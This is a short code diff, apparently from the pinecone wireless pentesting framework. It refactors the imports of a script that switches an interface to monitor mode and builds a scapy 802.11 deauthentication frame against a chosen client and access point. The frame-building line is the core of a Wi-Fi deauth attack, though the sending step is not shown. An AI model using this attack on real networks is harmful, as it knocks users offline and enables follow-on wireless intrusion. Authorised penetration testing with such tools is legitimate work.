@@ -5,7 +5,7 @@ from argparse import ArgumentParser
 from pyric import pyw
 from scapy.layers.dot11 import *
 
-from pinecone.core.utils import IfaceUtils
+from pinecone.utils.interface import set_monitor_mode
 
 if __name__ == "__main__":
     args_parser = ArgumentParser()
@@ -17,7 +17,7 @@ if __name__ == "__main__":
 
     args = args_parser.parse_args()
 
-    interface = IfaceUtils.set_monitor_mode(args.iface)
+    interface = set_monitor_mode(args.iface)
     pyw.chset(interface, args.channel)
 
     deauth_packet = RadioTap()/Dot11(addr1=args.client, addr2=args.bssid, addr3=args.bssid)/Dot11Deauth()
